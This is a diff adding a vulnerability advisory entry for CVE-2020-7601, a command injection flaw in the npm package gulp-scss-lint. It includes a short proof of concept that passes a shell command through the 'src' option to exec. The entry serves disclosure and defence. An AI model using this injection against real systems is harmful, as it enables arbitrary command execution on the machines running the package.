@@ -1,0 +1,39 @@
+---
+- id: snykio:npm:gulp-scss-lint:560114
+  title: Command Injection
+  description: |
+    [gulp-scss-lint][1] is a Lint your .scss files.
+
+    Affected versions of this package are vulnerable to Command Injection.
+    It is possible to inject arbitrary commands to the `exec` function
+    located in `src/command.js` via the provided options.
+
+    ### PoC by JHU System Security Lab   {#poc-by-jhu-system-security-lab}
+
+        var root = require("gulp-scss-lint");
+        var attack_code = "echo vulnerable > create.txt";
+        var opt = {
+          "src": attack_code
+        }
+        root(opt);
+
+
+
+    [1]: https://www.npmjs.com/package/gulp-scss-lint
+  affected_package: gulp-scss-lint
+  vulnerable_versions:
+  - "*"
+  severity: medium
+  package_manager: npm
+  cve:
+  - CVE-2020-7601
+  cwe:
+  - CWE-78
+  disclosed_date: 2020-03-13
+  created_date: 2020-03-13
+  last_modified_date: 2020-03-13
+  credit:
+  - JHU System Security Lab
+  references:
+  - https://github.com/juanfran/gulp-scss-lint/blob/master/src/command.js#L61
+  source_url: https://snyk.io/vuln/SNYK-JS-GULPSCSSLINT-560114
